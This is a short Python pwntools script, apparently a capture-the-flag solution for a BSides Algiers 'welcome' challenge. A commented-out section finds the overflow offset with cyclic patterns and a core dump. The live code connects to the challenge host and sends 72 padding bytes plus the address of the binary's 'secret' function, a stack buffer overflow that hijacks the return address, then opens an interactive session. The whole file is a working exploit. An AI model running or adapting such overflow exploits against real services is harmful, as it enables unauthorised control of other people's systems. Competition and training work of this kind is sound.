from pwn import *

elf = ELF("./welcome")

#p = process("./welcome")

"""
p.sendline(cyclic(200, n=8))
p.wait()

core = p.corefile

print cyclic_find(core.read(core.rsp, 8), n=8)
"""
r = remote("chall.bsidesalgiers.com",4001)
r.sendline("A"*72+p64(elf.symbols['secret']))
r.interactive()

